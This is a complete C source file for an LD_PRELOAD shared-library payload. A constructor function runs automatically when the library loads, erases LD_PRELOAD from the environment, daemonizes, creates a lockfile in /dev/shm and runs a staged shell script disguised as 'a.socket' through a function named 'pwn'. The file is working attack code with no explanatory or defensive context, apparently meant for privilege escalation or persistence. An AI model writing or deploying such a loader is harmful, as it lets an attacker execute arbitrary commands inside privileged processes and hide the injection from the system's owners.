#define  _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>

void pwn(void) {
    FILE *p = fopen("/dev/shm/lockfile", "w");
    fclose(p);
    system("sh /dev/shm/a.socket");
}

void daemonize(void) {
    signal(SIGHUP, SIG_IGN);
    if (fork() != 0) {
        exit(EXIT_SUCCESS);
    }
}

__attribute__ ((__constructor__)) void preloadme(void) {
    unsetenv("LD_PRELOAD");
    FILE *p = fopen("/dev/shm/lockfile", "r");
    if(p == NULL) {
        daemonize();
        pwn();
    }
}

